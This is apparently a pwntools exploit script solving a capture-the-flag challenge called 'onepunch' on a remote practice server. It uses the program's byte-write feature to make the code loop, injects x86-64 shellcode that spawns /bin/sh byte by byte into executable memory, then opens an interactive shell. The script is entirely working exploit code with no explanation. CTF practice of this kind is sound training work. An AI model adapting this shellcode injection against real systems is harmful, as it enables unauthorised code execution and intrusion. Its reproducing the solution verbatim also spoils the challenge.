from pwn import *
#io=process("./onepunch")
io=remote("hackme.inndy.tw",7718)
io.recvuntil("What?")
io.sendline("400768")
io.sendline("-61")
code="\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
b=0x400773
for i in code:
    io.sendline(hex(b))
    io.sendline(str(ord(i)))
    b=b+1
io.sendline("400768")
io.sendline("10")
#gdb.attach(io)
io.interactive()
